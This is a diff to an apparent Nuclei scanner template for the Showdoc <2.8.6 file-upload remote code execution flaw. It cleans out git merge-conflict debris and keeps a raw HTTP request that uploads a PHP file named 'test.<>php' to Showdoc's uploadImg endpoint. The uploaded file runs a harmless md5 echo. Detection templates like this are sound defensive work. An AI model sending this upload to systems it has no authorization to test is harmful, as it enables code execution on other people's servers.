@@ -1,22 +1,9 @@
 id: showdoc-file-upload-rce
 
 info:
-<<<<<<< HEAD
-<<<<<<< HEAD
-  name: Showdoc < 2.8.6 File Upload RCE
-  author: pikpikcu
-  severity: critical
-  reference: https://github.com/star7th/showdoc/pull/1059
-  tags: rce,fileupload,showdoc
-=======
   name: Showdoc <2.8.6 - Remote Code Execution
   author: pikpikcu
   severity: critical
-=======
-  name: Showdoc <2.8.6 - Remote Code Execution
-  author: pikpikcu
-  severity: critical
->>>>>>> 18ddf72b (add new stuff)
   description: |
     Showdoc versions before 2.8.6 is susceptible to remote code execution.
   reference:
@@ -26,28 +13,13 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: rce,fileupload,showdoc,oss,intrusive
-<<<<<<< HEAD
->>>>>>> 5d36d276 (add new stuff)
-=======
->>>>>>> 18ddf72b (add new stuff)
 
 requests:
   - raw:
       - |
         POST /index.php?s=/home/page/uploadImg HTTP/1.1
         Host: {{Hostname}}
-<<<<<<< HEAD
-<<<<<<< HEAD
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
-        Content-Length: 239
         Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
-        Accept-Encoding: gzip
-=======
-        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
->>>>>>> 5d36d276 (add new stuff)
-=======
-        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
->>>>>>> 18ddf72b (add new stuff)
 
         ----------------------------835846770881083140190633
         Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
@@ -56,24 +28,6 @@ requests:
         <?php echo md5('rce_test');?>
         ----------------------------835846770881083140190633--
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-      - |
-        GET /Public/Uploads{{url_decode("§path§")}} HTTP/1.1
-        Host: {{Hostname}}
-        Origin: {{BaseURL}}
-
-    extractors:
-      - type: regex
-        name: path
-        group: 1
-        internal: true
-        part: body
-        regex:
-          - '/Uploads\\(.*?)"\,"success"'
-
-=======
->>>>>>> 18ddf72b (add new stuff)
     matchers-condition: and
     matchers:
       - type: word
@@ -86,22 +40,6 @@ requests:
       - type: status
         status:
           - 200
-<<<<<<< HEAD
-=======
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"url":"http:'
-          - '"success":1'
-        condition: and
-
-      - type: status
-        status:
-          - 200
-=======
->>>>>>> 18ddf72b (add new stuff)
 
     extractors:
       - type: json
@@ -109,7 +47,3 @@ requests:
           - '.url'
 
 # Enhanced by mp on 2022/05/30
-<<<<<<< HEAD
->>>>>>> 5d36d276 (add new stuff)
-=======
->>>>>>> 18ddf72b (add new stuff)
